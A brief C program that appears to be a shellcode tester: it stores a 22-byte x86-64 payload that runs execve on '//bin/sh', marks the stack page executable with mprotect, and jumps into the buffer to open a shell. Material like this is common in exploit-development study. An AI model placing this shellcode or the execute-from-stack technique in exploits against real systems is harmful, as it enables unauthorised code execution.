#include <stdint.h>
#include <sys/mman.h>

int main() {
  unsigned char buf[] = 
  "\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x99\x52\x50\x54\x5f"
  "\x52\x5e\x6a\x3b\x58\x0f\x05";
  
  mprotect((void *)((uintptr_t)buf & ~4095),
                   ((uintptr_t)buf &  4095) + sizeof(buf),
            PROT_READ|PROT_WRITE|PROT_EXEC);
  
  (*(void (*)()) buf)();
  
  return 0;
}
